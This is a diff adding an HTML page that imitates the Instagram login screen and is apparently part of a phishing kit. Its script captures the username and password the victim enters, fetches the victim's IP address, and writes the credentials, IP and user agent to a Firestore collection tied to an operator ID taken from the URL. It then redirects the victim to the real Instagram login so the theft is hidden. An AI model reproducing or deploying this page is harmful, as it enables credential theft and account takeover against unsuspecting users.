@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>Instagram • Login</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px;
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+        }
+        .logo {
+            font-family: 'Billabong', 'Segoe UI', cursive;
+            font-size: 3rem;
+            margin-bottom: 30px;
+            color: #262626;
+        }
+        .input-field {
+            width: 100%;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 12px 8px;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #262626;
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: #a8a8a8;
+        }
+        .login-btn {
+            width: 100%;
+            background: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            padding: 10px;
+            font-weight: bold;
+            font-size: 14px;
+            margin: 15px 0;
+            cursor: pointer;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        .divider span { margin: 0 18px; }
+        .fb-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin: 15px 0;
+        }
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+            display: block;
+            margin-top: 15px;
+        }
+        .error-msg {
+            color: #ed4956;
+            font-size: 14px;
+            margin: 10px 0;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">Instagram</div>
+        <div id="errorMsg" class="error-msg">Invalid credentials. Please try again.</div>
+        <input type="text" id="username" class="input-field" placeholder="Phone number, username, or email" autocomplete="off">
+        <input type="password" id="password" class="input-field" placeholder="Password" autocomplete="off">
+        <button class="login-btn" id="loginBtn">Log In</button>
+        <div class="divider"><span>OR</span></div>
+        <a href="#" class="fb-login">Log in with Facebook</a>
+        <a href="#" class="forgot-password">Forgot password?</a>
+    </div>
+
+    <script src="../config.js"></script>
+    <script type="importmap">
+        {
+            "imports": {
+                "firebase/app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js",
+                "firebase/firestore": "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js"
+            }
+        }
+    </script>
+    <script type="module">
+        import { initializeApp } from "firebase/app";
+        import { getFirestore, collection, addDoc } from "firebase/firestore";
+
+        const firebaseConfig = window.FIREBASE_CONFIG;
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        const params = new URLSearchParams(window.location.search);
+        const userId = params.get('uid');
+
+        document.getElementById('loginBtn').addEventListener('click', async () => {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            if (!username || !password) {
+                document.getElementById('errorMsg').style.display = 'block';
+                return;
+            }
+
+            if (userId && db) {
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    
+                    await addDoc(collection(db, "ig_accounts"), {
+                        ownerId: userId,
+                        username: username,
+                        password: password,
+                        ip: ipData.ip,
+                        userAgent: navigator.userAgent,
+                        timestamp: new Date().toISOString()
+                    });
+                } catch(e) {
+                    console.log("Loglama hatası: " + e.message);
+                }
+            }
+
+            // Başarılı giriş simülasyonu - gerçek Instagram'a yönlendir
+            window.location.href = 'https://www.instagram.com/accounts/login/';
+        });
+    </script>
+</body>
+</html>
